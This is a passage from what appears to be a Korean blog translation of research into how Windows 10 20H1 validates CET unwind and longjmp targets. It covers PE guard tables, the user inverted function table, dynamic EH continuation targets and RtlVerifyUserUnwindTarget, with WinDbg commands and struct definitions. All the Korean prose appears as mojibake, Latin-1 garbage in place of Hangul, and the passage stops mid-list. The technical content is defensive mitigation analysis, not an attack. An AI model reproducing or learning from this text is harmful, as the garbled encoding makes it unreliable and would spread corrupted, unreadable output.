ì„€ë„ìš° ìŠ¤íƒì˜ ì¼ë¶€ì¸ì§€ í™•ì¸í•˜ëŠ” ê²ƒê³¼ ê´€ë ¨ì´ ìˆì§€ë§Œ <code>KCONTEXT_UNWIND</code> ë° <code>KCONTEXT_LONGJMP</code> ê²½ìš°ì—ëŠ” <code>RtlVerifyUserUnwindTarget</code>ì„ í†µí•œ í™•ì¥ëœ ìœ íš¨ì„± ê²€ì‚¬ê°€ í•„ìš”í•˜ë‹¤. ì´ ë‘ ë²ˆì§¸ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìœ„í•´ì„œëŠ” PE íŒŒì¼ í˜•ì‹ (ë° ì»´íŒŒì¼ëŸ¬ ì§€ì›)ì„ ë³€ê²½í•´ì•¼ í•˜ë©° JIT ì»´íŒŒì¼ëŸ¬ ì§€ì›ì„ ìœ„í•´ <a href="https://github.com/yardenshafir/cet-research/blob/master/src/NtSetInformationProcess.c">NtSetInformationProcess</a>ì— ì¶”ê°€ëœ ìƒˆë¡œìš´ OS ìˆ˜ì¤€ì˜ ì •ë³´ í´ë˜ìŠ¤ê°€ í¬í•¨ë˜ì–´ ìˆë‹¤.</p><p>CFG (Control Flow Guard) ì§€ì›ìœ¼ë¡œ ì¸í•´ ì´ë¯¸ ì¶”ê°€ëœ PE íŒŒì¼ ë‚´ë¶€ì˜ <code>Image Load Configuration Directory</code>ì—ëŠ” í˜„ì¬ ì„¤ì •ëœ <code>jmp/longjmp</code> ìŒì˜ ì¼ë¶€ë¡œ ì‚¬ìš©ë˜ëŠ” ë¶„ê¸° ìœ íš¨ ëŒ€ìƒì— ëŒ€í•œ ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìœ¼ë©°, ì´ ì •ë³´ë¥¼ ì»´íŒŒì¼ëŸ¬ê°€ ì‹ë³„í•´ ë§ì»¤ì— ì „ë‹¬í•˜ë„ë¡ ë˜ì–´ ìˆë‹¤. CETë¥¼ ì‚¬ìš©í•˜ë©´ ì´ ê¸°ì¡´ ë°ì´í„°ê°€ ì¬ì‚¬ìš©ë˜ì§€ë§Œ ì—°ì† ì˜ˆì™¸ í•¸ë“¤ëŸ¬ ì§€ì›ì„ ìœ„í•´ ë˜ ë‹¤ë¥¸ í…Œì´ë¸”ê³¼ í¬ê¸°ê°€ ì¶”ê°€ëœë‹¤. Visual Studio 2017ì€ <code>longjmp</code> í…Œì´ë¸”ì„ ìƒì„±í•˜ì§€ë§Œ Visual Studio 2019ë¶€í„° ìœ„ì™€ ê°™ì€ ì •ë³´ê°€ í¬í•¨ëœ í…Œì´ë¸”ì„ ìƒì„±í•œë‹¤.</p><p>ì´ ë§ˆì§€ë§‰ ì„¹ì…˜ì—ì„œëŠ” ì´ëŸ¬í•œ í…Œì´ë¸”ì˜ í˜•ì‹ê³¼ ì»¤ë„ì´ ë§ˆì§€ë§‰ ë‘ ê°€ì§€ ìœ í˜•ì˜ <code>KCONTINUE_TYPE</code> ì œì–´ íë¦„ì„ ê²€ì¦í•˜ëŠ” ë°©ë²•ì„ ì‚´í´ë³´ê² ë‹¤.</p><h2 id="PE-ë©”íƒ€-ë°ì´í„°-í…Œì´ë¸”"><a href="#PE-ë©”íƒ€-ë°ì´í„°-í…Œì´ë¸”" class="headerlink" title="PE ë©”íƒ€ ë°ì´í„° í…Œì´ë¸”"></a>PE ë©”íƒ€ ë°ì´í„° í…Œì´ë¸”</h2><p>Windows 10ì€ Control Flow Guard ì´ë¯¸ì§€ì— ìˆëŠ” í‘œì¤€ GFIDS í…Œì´ë¸” ì™¸ì—ë„  RVAê°€ ì €ì¥ë˜ëŠ” <code>.gljmp</code>ë¼ëŠ” PE Image Load Configurationì˜ <code>Guard Long Jump Target Table</code> í•„ë“œì— ì €ì¥ëœ PE ì„¹ì…˜ì˜ Long Jump Target Tableì„ í¬í•¨í•˜ì—¬ longjump ëŒ€ìƒì˜ ìœ íš¨ì„± ê²€ì‚¬ì— ëŒ€í•œ ì§€ì›ì„ ì¶”ê°€í–ˆë‹¤.</p><p><code>setjmp</code>ì— ëŒ€í•œ í˜¸ì¶œì´ ì½”ë“œì—ì„œ ìˆ˜í–‰ë  ë•Œë§ˆë‹¤ ë°˜í™˜ ì£¼ì†Œ (longjmpê°€ ë¶„ê¸°ë˜ëŠ” ìœ„ì¹˜)ì˜ RVAê°€ ì´ í…Œì´ë¸”ì— ì¶”ê°€ëœë‹¤. ì´ í…Œì´ë¸”ì˜ ì¡´ì¬ ì—¬ë¶€ëŠ” Image Load Configuration Directoryì˜ <code>GuardFlags</code>ì— ìˆëŠ” <code>IMAGE_GUARD_CF_LONGJUMP_TABLE_PRESENT</code> í”Œë˜ê·¸ì— ì˜í•´ ê²°ì •ë˜ë©° <code>GuardLongJumpTargetCount</code> í•„ë“œì— í‘œì‹œëœ ë§Œí¼ì˜ í•­ëª©ì„ í¬í•¨í•œë‹¤.</p><p>ê° í•­ëª©ì€ 4 ë°”ì´íŠ¸ RVAì™€ n ë°”ì´íŠ¸ì˜ ë©”íƒ€ ë°ì´í„°ì´ë‹¤. ì—¬ê¸°ì„œ nì€ <code>(GuardFlags &amp; IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK) &gt;&gt; IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_SHIFT</code>ì˜ ê²°ê³¼ì—ì„œ ê°€ì ¸ì˜¨ë‹¤. ì´ í…Œì´ë¸”ì˜ ê²½ìš° ë©”íƒ€ ë°ì´í„°ê°€ ì •ì˜ë˜ì§€ ì•Šì•˜ìœ¼ë¯€ë¡œ ë©”íƒ€ ë°ì´í„° ë°”ì´íŠ¸ëŠ” í•­ìƒ 0ì´ ë  ê²ƒìœ¼ë¡œ ì˜ˆìƒëœë‹¤. ì´ ê³„ì‚°ì€ <code>GFIDS</code> í…Œì´ë¸” (<code>export suppression</code>ê°€ í™œì„±í™”ëœ ê²½ìš° ì ì¬ì ìœ¼ë¡œ ë©”íƒ€ ë°ì´í„°ê°€ ìˆìŒ)ì— ì‚¬ìš©ëœ ê³„ì‚°ê³¼ ë™ì¼í•˜ê¸° ë•Œë¬¸ì— í•˜ë‚˜ ì´ìƒì˜ CFG ëŒ€ìƒì„ ì–µì œí•˜ë©´ 1 ë°”ì´íŠ¸ì˜ ë¹ˆ ë©”íƒ€ë°ì´í„°ê°€ Long Jump Target Target Tableì˜ ëª¨ë“  í•­ëª©ì— ì¶”ê°€ëœë‹¤.</p><p>ì˜ˆë¥¼ ë“¤ì–´ ë‹¤ìŒì€ ë‘ ê°œì˜ <code>longjmp</code> ëŒ€ìƒì´ ìˆëŠ” PE íŒŒì¼ì´ë‹¤.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/8.png"></p><p>ì´ ì´ë¯¸ì§€ë„ CFG ë‚´ë³´ë‚´ê¸° ì–µì œë¥¼ ì‚¬ìš©í•˜ë¯€ë¡œ <code>GuardFlags</code>ì˜ ìƒìœ„ ë‹ˆë¸” (<code>IMAGE_GUARD_CF_FUNCTION_TABLE_SIZE_MASK</code>ì— í•´ë‹¹)ì— ìˆëŠ” ê°’ 1ì— ìœ ì˜í•˜ì. ì´ëŠ” ì•„ë˜ì—ì„œ ë³¼ ìˆ˜ ìˆëŠ” Long Jump Target Tableì— 1 ë°”ì´íŠ¸ì˜ ì¶”ê°€ ë©”íƒ€ ë°ì´í„°ê°€ ìˆìŒì„ ì•Œë ¤ì¤€ë‹¤.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/9.png"></p><p><code>Windows 10 20H1</code>ì—ì„œ ì´ëŸ¬í•œ ìœ í˜•ì˜ ë©”íƒ€ ë°ì´í„°ëŠ” ì—°ì† ëŒ€ìƒì— ëŒ€í•œ ì˜ˆì™¸ í•¸ë“¤ëŸ¬ê°€ ë°”ì´ë„ˆë¦¬ì˜ ì œì–´ íë¦„ì˜ ì¼ë¶€ë¡œ ì¡´ì¬í•˜ëŠ” ê²½ìš°ì— í¬í•¨ëœë‹¤. ë‘ ê°œì˜ ìƒˆë¡œìš´ í•„ë“œ <code>GuardEHContinuationTable</code> ë° <code>GuardEHContinuationCount</code>ê°€ Image Load Configuration Directory ëì— ì¶”ê°€ë˜ê³  <code>IMAGE_GUARD_EH_CONTINUATION_TABLE_PRESENT</code> í”Œë˜ê·¸ê°€ <code>GuardFlags</code>ì— í¬í•¨ëœë‹¤. ì´ í…Œì´ë¸”ì˜ ë ˆì´ì•„ì›ƒì€ <code>GuardFlags</code>ì˜ ìƒìœ„ ë‹ˆë¸”ì„ ê¸°ë°˜ìœ¼ë¡œ í•œ ë©”íƒ€ ë°ì´í„° ë°”ì´íŠ¸ ì¶”ê°€ë¥¼ í¬í•¨í•˜ì—¬ Long Jump Target Tableì— ëŒ€í•´ í‘œì‹œëœ ê²ƒê³¼ ë™ì¼í•˜ë‹¤.</p><p>ì•ˆíƒ€ê¹ê²Œë„ Visual Studio 2019 ë²„ì „ì—ì„œë„ ì´ ë°ì´í„°ë¥¼ ìƒì„±í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ í˜„ì¬ ì˜ˆì œë¥¼ ë³´ì—¬ì¤„ ìˆ˜ ì—†ë‹¤. ì´ ë¶„ì„ì€ ë‚˜ì¤‘ì— ì„¤ëª…í•˜ëŠ” ìœ íš¨ì„± ê²€ì‚¬ ì½”ë“œì™€ 20H1 SDKì˜ <code>Ntimage.h</code> í—¤ë” íŒŒì¼ì„ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ í•œ ê¸°ë°˜ìœ¼ë¡œ í•œë‹¤.</p><h2 id="ì‚¬ìš©ì-ë°˜ì „-ê¸°ëŠ¥-í…Œì´ë¸”"><a href="#ì‚¬ìš©ì-ë°˜ì „-ê¸°ëŠ¥-í…Œì´ë¸”" class="headerlink" title="ì‚¬ìš©ì ë°˜ì „ ê¸°ëŠ¥ í…Œì´ë¸”"></a>ì‚¬ìš©ì ë°˜ì „ ê¸°ëŠ¥ í…Œì´ë¸”</h2><p>ì´ì œ longjmp ëŒ€ìƒ ë˜ëŠ” ì—°ì† ëŒ€ìƒì— ëŒ€í•œ ì˜ˆì™¸ í•¸ë“¤ëŸ¬ë¡œ ë¶„ê¸°í•˜ê¸° ìœ„í•´ ì œì–´ íë¦„ ë³€ê²½ì´ ë°œìƒí•  ìˆ˜ ìˆìŒì„ ì•Œê³  ìˆìœ¼ë¯€ë¡œ CONTEXT_EXì— ìˆëŠ” RIP ì£¼ì†Œë¥¼ ê¸°ë°˜ìœ¼ë¡œ ì´ ë‘ í…Œì´ë¸”ì„ ì–´ë–»ê²Œ ì–»ì„ ìˆ˜ ìˆì„ê¹Œ? NtContinueEx ì „í™”? ì´ëŸ° ì‘ì—…ì€ íŠ¹ì • í”„ë¡œê·¸ë¨ ì‹¤í–‰ì—ì„œ ìì£¼ ë°œìƒí•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì»¤ë„ì€ ì´ ë¬¸ì œë¥¼ í•´ê²°í•˜ê¸° ìœ„í•œ íš¨ìœ¨ì ì¸ ë°©ë²•ì´ í•„ìš”í•˜ë‹¤.</p><p><code>Inverted Function Table</code>ì˜ ê°œë…ì— ì´ë¯¸ ìµìˆ™í•  ê²ƒì´ë‹¤. ì´ëŸ¬í•œ í…Œì´ë¸”ì€ <code>Ntdll.dll (LdrpInvertedFunctionTable)</code> ì—ì„œ ìœ ì € ëª¨ë“œ ì˜ˆì™¸ ì²˜ë¦¬ ì¤‘ í•´ì œ opcode ë° ì˜ˆì™¸ ë°ì´í„°ë¥¼ ì°¾ëŠ” ë° ì‚¬ìš©ëœë‹¤. (<code>.pdata</code> ì„¹ì…˜ì„ ì°¾ì•„ì„œ) <code>Ntoskrnl.exe (PsInvertedFunctionTable)</code>ì— ë˜ ë‹¤ë¥¸ í…Œì´ë¸”ì´ ìˆìœ¼ë©° ì»¤ë„ ëª¨ë“œ ì˜ˆì™¸ ì²˜ë¦¬ ë° PatchGuard ê²€ì‚¬ì˜ ì¼ë¶€ì— ì‚¬ìš©ëœë‹¤.</p><p>ê°„ë‹¨íˆ ë§í•´ <code>Inverted Function Table</code>ì€ ë¡œë“œëœ ëª¨ë“  ìœ ì €/ì»¤ë„ ëª¨ë“ˆ í¬ê¸°ì™€ ê°€ìƒ ì£¼ì†Œë³„ë¡œ ì •ë ¬ëœ PE ì˜ˆì™¸ ë””ë ‰í„°ë¦¬ì— ëŒ€í•œ í¬ì¸í„°ë¥¼ í¬í•¨í•˜ëŠ” ë°°ì—´ì´ë‹¤. ì´ ë°°ì—´ì„ ê²€ìƒ‰í•˜ëŠ” ê²ƒì´ PE í—¤ë”ë¥¼ êµ¬ë¬¸ ë¶„ì„í•œ ë’¤ ë¡œë“œëœ ëª¨ë“ˆ ì—°ê²° ëª©ë¡ì„ ê²€ìƒ‰í•˜ëŠ” ê²ƒë³´ë‹¤ í›¨ì”¬ ë¹ ë¥´ê¸° ë•Œë¬¸ì— ì—­í•¨ìˆ˜ í…Œì´ë¸”ì˜ binary searchëŠ” ë¡œê·¸(n) ì¡°íšŒì—ì„œë§Œ í•´ë‹¹ ëª¨ë“ˆì˜ ê°€ìƒ ì£¼ì†Œë¥¼ ë¹ ë¥´ê²Œ ì°¾ëŠ”ë‹¤. í˜„ì¬ Microsoftì˜ ëª…ì„±ì„ ì–»ê³  ìˆëŠ” Ken Johnsonê³¼ Matt MillerëŠ” ì´ì „ì— Uninformed Magazineì— <a href="http://uninformed.org/index.cgi?v=8&a=2&p=20">ì»¤ë„ ëª¨ë“œ í›„í‚¹ ê¸°ìˆ </a>ì— ëŒ€í•œ ê¸°ì‚¬ì˜ ì¼ë¶€ë¡œ ê°œìš”ë¥¼ ê²Œì‹œí–ˆë‹¤.</p><p>ê·¸ëŸ¬ë‚˜ ì´ì „ì—ëŠ” <code>Ntdll.dll</code>ì€ í…Œì´ë¸”ì—ì„œ ìœ ì € ëª¨ë“œ ì˜ˆì™¸ë§Œ, <code>Ntoskrnl.exe</code>ëŠ” ì»¤ë„ ëª¨ë“œ ì˜ˆì™¸ë§Œ ê²€ì‚¬í–ˆë‹¤. <code>20H1</code>ì˜ ë³€ê²½ ì‚¬í•­ì€ ì»¤ë„ë„ ì‚¬ìš©ì í…Œì´ë¸”ì„ ê²€ì‚¬í•´ì•¼ í•œë‹¤ëŠ” ê²ƒì´ë‹¤. <code>longjmp</code> ë° ì˜ˆì™¸ ì—°ì†ì„ ì²˜ë¦¬í•˜ëŠ” ë° í•„ìš”í•œ ìƒˆë¡œìš´ ë¡œì§ì„ ì§€ì›í•˜ê¸° ìœ„í•´ ìƒˆë¡œìš´ <code>RtlpLookupUserFunctionTableInverted</code> í•¨ìˆ˜ê°€ ì¶”ê°€ë˜ì–´ <code>KeUserInvertedFunctionTable</code> ë³€ìˆ˜ë¥¼ ìŠ¤ìº”í•˜ê³  <code>Ntdll.dll</code>ì—ì„œ í˜„ì¬ ë‚´ë³´ë‚¸ <code>LdrpInvertedFunctionTable</code> ì‹¬ë³¼ì— ë§¤í•‘ëœë‹¤.</p><p>ì´ê²ƒì€ í¥ë¯¸ë¡œìš´ í¬ë Œì‹ ê¸°ëŠ¥ìœ¼ë¡œ, ì»¤ë„ì—ì„œ PEBì˜ ë¡œë” ë°ì´í„°ë¥¼ êµ¬ë¬¸ ë¶„ì„í•˜ê±°ë‚˜ VADë¥¼ ì—´ê±°í•  í•„ìš” ì—†ì´ í˜„ì¬ í”„ë¡œì„¸ìŠ¤ ë‚´ì— ë¡œë“œëœ ìœ ì € ëª¨ë“œ ëª¨ë“ˆì„ ì‰½ê²Œ ì°¾ì„ ìˆ˜ ìˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ë‹¤ìŒì€ <code>Csrss.exe</code>ì—ì„œ í˜„ì¬ ë¡œë“œëœ ì´ë¯¸ì§€ë¥¼ ë³´ëŠ” ë°©ë²•ì´ë‹¤.</p><pre><code class="hljs c">dx @$cursession.Processes.Where(p =&gt; p.Name == <span class="hljs-string">&quot;csrss.exe&quot;</span>).First().SwitchTo()dx -r0 @$table = *(nt!_INVERTED_FUNCTION_TABLE**)&amp;nt!KeUserInvertedFunctionTabledx -g @$table-&gt;TableEntry.Take(@$table-&gt;CurrentSize)</code></pre><p>ì¦‰, ì›ê²©ì—ì„œë„ íŠ¹íˆ <code>unwind opcode</code> ê°€ì—†ëŠ” x86 ì‹œìŠ¤í…œì—ì„œëŠ” ì´ë¯¸ì§€ê°€ ì˜ˆì™¸ ë””ë ‰í„°ë¦¬ë¥¼ í¬í•¨ë˜ì§€ ì•Šì„ ê°€ëŠ¥ì„±ì´ ìˆìœ¼ë©°, <code>.pdata</code>ëŠ” <code>/SAFESEH</code>ë¥¼ ì‚¬ìš©í•˜ê³  ì ì–´ë„ í•˜ë‚˜ì˜ ì˜ˆì™¸ í•¸ë“¤ëŸ¬ê°€ ìˆëŠ” ê²½ìš°ì—ë§Œ ìƒì„±ëœë‹¤.</p><p>ì´ëŸ¬í•œ ìƒí™©ì—ì„œëŠ” <code>RtlpLookupUserFunctionTableInverted</code>ê°€ ì‹¤íŒ¨í•  ìˆ˜ ìˆìœ¼ë©° ëŒ€ì‹  <code>MmGetImageBase</code>ë¥¼ ì‚¬ìš©í•´ì•¼ í•œë‹¤. ì´ê²ƒì€ ì…ë ¥ RIPì— í•´ë‹¹í•˜ëŠ” ì˜ì—­ì„ ë§¤í•‘í•˜ëŠ” VADë¥¼ ì¡°íšŒí•˜ê³  ì´ë¯¸ì§€ VAD ì¸ ê²½ìš° í•´ë‹¹ ì˜ì—­ì˜ ê¸°ë³¸ ì£¼ì†Œì™€ í¬ê¸° (ëª¨ë“ˆì˜ í¬ê¸°ì™€ ì¼ì¹˜í•´ì•¼ í•¨)ë¥¼ ë°˜í™˜í•œë‹¤.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/10.png"></p><h2 id="ì—°ì†ëœ-ëŒ€ìƒì—-ëŒ€í•œ-ë™ì -ì˜ˆì™¸-í•¸ë“¤ëŸ¬"><a href="#ì—°ì†ëœ-ëŒ€ìƒì—-ëŒ€í•œ-ë™ì -ì˜ˆì™¸-í•¸ë“¤ëŸ¬" class="headerlink" title="ì—°ì†ëœ ëŒ€ìƒì— ëŒ€í•œ ë™ì  ì˜ˆì™¸ í•¸ë“¤ëŸ¬"></a>ì—°ì†ëœ ëŒ€ìƒì— ëŒ€í•œ ë™ì  ì˜ˆì™¸ í•¸ë“¤ëŸ¬</h2><p><code>KCONTINUE_UNWIND</code> ìš”ì²­ì„ ì²˜ë¦¬í•˜ëŠ”ë° ë§ˆì§€ë§‰ ì¥ì• ë¬¼ì´ í•˜ë‚˜ ìˆë‹¤. ì •ê·œ í”„ë¡œì„¸ìŠ¤ì—ëŠ” ì½”ë“œì˜ <code>__try /__except /__finally</code> ì ˆì„ ê¸°ë°˜ìœ¼ë¡œ í•˜ëŠ” ì—°ì†ëœ ëŒ€ìƒì— ëŒ€í•œ ì •ì  ì˜ˆì™¸ í•¸ë“¤ëŸ¬ê°€ ìˆì§€ë§Œ Windowsì—ì„œëŠ” JIT ì—”ì§„ì´ ì‹¤í–‰ ê°€ëŠ¥í•œ ì½”ë“œë¥¼ ë™ì ìœ¼ë¡œ ì¦‰ì‹œ ìƒì„±í•  ìˆ˜ ìˆì„ ë¿ë§Œ ì•„ë‹ˆë¼ <code>RtlAddFunctionTable</code> API ë“±ì„ í†µí•´ ëŸ°íƒ€ì„ì— ì˜ˆì™¸ í•¸ë“¤ëŸ¬ë¥¼ ë“±ë¡í•˜ê³  opcodeë¥¼ í•´ì œí•  ìˆ˜ ìˆë‹¤. ì´ëŸ¬í•œ ì˜ˆì™¸ í•¸ë“¤ëŸ¬ëŠ” ì´ì „ì—ëŠ” ì‚¬ìš©ì ëª¨ë“œ stack walking ë° ì˜ˆì™¸ í•´ì œì—ë§Œ í•„ìš”í–ˆì§€ë§Œ ì´ì œëŠ” ì—°ì† í•¸ë“¤ëŸ¬ê°€ ì»¤ë„ì´ RIPì— ëŒ€í•´ ì ì¬ì ìœ¼ë¡œ ìœ íš¨í•œ ê°’ìœ¼ë¡œ ì²˜ë¦¬í•´ì•¼ í•˜ëŠ” ì œì–´ íë¦„ ëŒ€ìƒì´ ëœë‹¤. <code>RtlpFindDynamicEHContinuationTarget</code>ì´ ì²˜ë¦¬í•˜ëŠ” ê²ƒì´ ë§ˆì§€ë§‰ ê°€ëŠ¥ì„±ì´ë‹¤.</p><p>CET ì§€ì› ë° <code>NtContinueEx</code> ë„ì…ì˜ ì¼ë¶€ë¡œ EPROCESS êµ¬ì¡°ëŠ” <code>DynamicEHContinuationTargetsLock</code> ë° <code>DynamicEHContinuationTargetsTree</code>ë¼ëŠ” ë‘ ê°œì˜ ìƒˆë¡œìš´ í•„ë“œë¡œ í–¥ìƒë˜ì—ˆë‹¤. ì²« ë²ˆì§¸ëŠ” <code>EX_PUSH_LOCK</code>ì´ê³  ë‘ ë²ˆì§¸ëŠ” ëª¨ë“  ìœ íš¨í•œ ì˜ˆì™¸ í•¸ë“¤ëŸ¬ ì£¼ì†Œë¥¼ í¬í•¨í•˜ëŠ” <code>RTL_RB_TREE</code>ì´ë‹¤. ì´ íŠ¸ë¦¬ëŠ” <code>PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION</code> ìœ í˜•ì˜ ë°ì´í„° êµ¬ì¡°ì™€ í•¨ê»˜ ìƒˆë¡œìš´ í”„ë¡œì„¸ìŠ¤ ì •ë³´ í´ë˜ìŠ¤ ì¸ <code>ProcessDynamicEHContinuationTargets</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ <code>NtSetInformationProcess</code>ì— ëŒ€í•œ í˜¸ì¶œì„ í†µí•´ ê´€ë¦¬ëœë‹¤. ë” ì‰½ê²Œ ì´í•´í•˜ë ¤ë©´ ì´ëŸ¬í•œ êµ¬ì¡° ë° í”Œë˜ê·¸ì— ëŒ€í•œ ì•„ë˜ ì •ì˜ë¥¼ ì°¸ì¡°í•˜ë©´ ëœë‹¤.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DYNAMIC_EH_CONTINUATION_TARGET_ADD          0x01</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DYNAMIC_EH_CONTINUATION_TARGET_PROCESSED    0x02</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PROCESS_DYNAMIC_EH_CONTINUATION_TARGET</span></span><span class="hljs-class">&#123;</span>     ULONG_PTR TargetAddress;    ULONGLONG Flags;&#125; PROCESS_DYNAMIC_EH_CONTINUATION_TARGET, *PPROCESS_DYNAMIC_EH_CONTINUATION_TARGET;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION</span></span><span class="hljs-class">&#123;</span>    USHORT NumberOfTargets;    USHORT Reserved;    ULONG Reserved2;    PPROCESS_DYNAMIC_EH_CONTINUATION_TARGET* Targets;&#125; PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION, *PPROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION;</code></pre><p><code>PspProcessDynamicEHContinuationTargets</code> í•¨ìˆ˜ê°€ ì´ ë°ì´í„°ë¥¼ ë°˜ë³µí•˜ê¸° ìœ„í•´ í˜¸ì¶œë˜ë©°, ì´ ì‹œì ì—ì„œ <code>RtlAddDynamicEHContinuationTarget</code>ì€ ëŒ€ìƒ ì£¼ì†Œë¥¼ ì €ì¥í•˜ëŠ” ë°ì´í„° êµ¬ì¡°ë¥¼ í• ë‹¹í•˜ê³  <code>ETL_RB_TREE_BPROCESS.NODE</code>ì— <code>RTL_RB_NODE</code> ë§í¬ë¥¼ ì—°ê²°í•˜ëŠ” <code>DYNAMIC_EH_CONTINUATION_TARGET_ADD</code> í”Œë˜ê·¸ ì„¸íŠ¸ë¥¼ í¬í•¨í•˜ëŠ” í•­ëª©ì— ëŒ€í•´ í˜¸ì¶œë˜ë©° ë°˜ëŒ€ë¡œ í”Œë˜ê·¸ê°€ ì—†ìœ¼ë©´ ëŒ€ìƒì„ ì¡°íšŒí•˜ê³  ì‹¤ì œë¡œ ì¡´ì¬í•˜ëŠ” ê²½ìš° ì œê±°ë˜ê³  ë…¸ë“œê°€ í•´ì œëœë‹¤. ê° í•­ëª©ì´ ì²˜ë¦¬ë  ë•Œ <code>DYNAMIC_EH_CONTINUATION_TARGET_PROCESSED</code> í”Œë˜ê·¸ê°€ ì›ë˜ ì…ë ¥ ë²„í¼ì— OR ì²˜ë¦¬ë˜ë¯€ë¡œ í˜¸ì¶œìëŠ” ì–´ë–¤ í•­ëª©ì´ ì‘ë™í•˜ê³  ì‘ë™í•˜ì§€ ì•Šì•˜ëŠ”ì§€ ì•Œ ìˆ˜ ìˆë‹¤.</p><p>ê°€ëŠ¥í•œ ëª¨ë“  ROP ê°€ì ¯ì´ ë‹¨ìˆœíˆ â€˜ë™ì  ì—°ì† ëª©í‘œâ€™ë¡œ ì¶”ê°€ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œì´ ê¸°ëŠ¥ì˜ ì¡´ì¬ëŠ” CET/CFGì™€ ìœ ì‚¬í•œ ê¸°ëŠ¥ì˜ ë³´í¸ì ì¸ ìš°íšŒë¡œ ë³´ì¸ë‹¤. ê·¸ëŸ¬ë‚˜ MicrosoftëŠ” ë¸Œë¼ìš°ì €ì™€ Flashì— ëŒ€í•œ <code>out-of-process JIT</code> ì»´íŒŒì¼ë§Œ ê³µì‹ì ìœ¼ë¡œ ì§€ì›í•˜ë¯€ë¡œ ì´ APIëŠ” ì›ê²© í”„ë¡œì„¸ìŠ¤ì—ì„œë§Œ ì‘ë™í•œë‹¤ëŠ” ì ì— ìœ ì˜í•´ì•¼ í•œë‹¤. ë”°ë¼ì„œ í˜„ì¬ í”„ë¡œì„¸ìŠ¤ì—ì„œ í˜¸ì¶œí•˜ë©´ í•­ìƒ <code>STATUS_ACCESS_DENIED</code>ë¡œ ì‹¤íŒ¨í•œë‹¤.</p><h2 id="íƒ€ê²Ÿ-ê²€ì¦"><a href="#íƒ€ê²Ÿ-ê²€ì¦" class="headerlink" title="íƒ€ê²Ÿ ê²€ì¦"></a>íƒ€ê²Ÿ ê²€ì¦</h2><p>ì´ ëª¨ë“  ì§€ì‹ì„ í†µí•©í•˜ë©´ <code>RtlVerifyUserUnwindTarget</code> í•¨ìˆ˜ë¥¼ ì„¤ëª…í•˜ê¸° ì‰¬ì›Œì§„ë‹¤.</p><ol><li>CONTEXT_EX êµ¬ì¡°ì—ì„œ ëŒ€ìƒ RIPì™€ ì—°ê´€ëœ ë¡œë“œëœ PE ëª¨ë“ˆì„ ì¡°íšŒí•œë‹¤. ë¨¼ì € <code>RtlpLookupUserFunctionTableInverted</code>ë¥¼ ì‚¬ìš©í•˜ê³  ì‹¤íŒ¨í•˜ë©´ ëŒ€ì‹  <code>MmGetImageBase</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ ëª¨ë“ˆì´ 4GB ë¯¸ë§Œì¸ì§€ í™•ì¸í•œë‹¤.</li><li>ëª¨ë“ˆì´ ë°œê²¬ë˜ë©´ <code>LdrImageDirectoryEntryToLoadConfig</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ Image Load Configuration Directoryë¥¼ ê°€ì ¸ì˜¨ë‹¤. ê·¸ëŸ° ë‹¤ìŒ Long Jump ë˜ëŠ” ì—°ì† ëŒ€ìƒì— ëŒ€í•œ ë™ì  ì˜ˆì™¸ í•¸ë“¤ëŸ¬ í…Œì´ë¸”ì„ í¬í•¨í•  ìˆ˜ ìˆì„ ë§Œí¼ ì¶©ë¶„íˆ í°ì§€ì™€ <code>guardflags</code>ì— <code>IMAGE_GUARD_CF_LONGJUMP_TABLE_PRESENT</code> ë˜ëŠ” <code>IMAGE_GUARD_EH_CONTINUATION_TABLE_PRESENT</code>ê°€ í¬í•¨ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•œë‹¤. ë””ë ‰í„°ë¦¬ê°€ ì—†ê±°ë‚˜ ë„ˆë¬´ ì‘ì€ ê²½ìš° í˜¹ì€ ì¼ì¹˜í•˜ëŠ” í…Œì´ë¸”ì´ ì—†ëŠ” ê²½ìš° í˜¸í™˜ì„±ì„ ìœ„í•´ <code>STATUS_SUCCESS</code>ë¥¼ ë°˜í™˜í•œë‹¤.</li><li>Image Load Configuration Directoryì—ì„œ <code>GuardLongJumpTargetTable</code> ë˜ëŠ” <code>GuardEHContinuationTable</code>ì„ ê°€ì ¸ì˜¤ê³  <code>GuardLongJumpTargetCount</code> ë˜ëŠ” <code>GuardEHContinuationCount</code>ì˜ ìœ íš¨ì„±ì„ ê²€ì‚¬í•œë‹¤. í•­ëª©ì´ 40ì–µ ê°œ ì´ìƒì´ë©´ <code>STATUS_INTEGER_OVERFLOW</code>ë¥¼ ë°˜í™˜í•œë‹¤. 0 ê°œ ì´ìƒì˜ í•­ëª©ì´ ìˆëŠ” ê²½ìš° í…Œì´ë¸”ì„ í†µí•´ bsearch_s (ëŒ€ì¡°ìë¡œ <code>RtlpTarget Compare</code> ë¥¼ ì „ë‹¬)ë¥¼ ì‚¬ìš©í•˜ì—¬ binary searchë¥¼ í†µí•´ RVAë¡œ ë³€í™˜í•œ í›„ ëŒ€ìƒ RIPë¥¼ ì°¾ëŠ”ë‹¤. ë°œê²¬ë˜ë©´ <code>STATUS_SUCCESS</code>ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</li><li>ëŒ€ìƒ RIPë¥¼ ì°¾ì„ ìˆ˜ 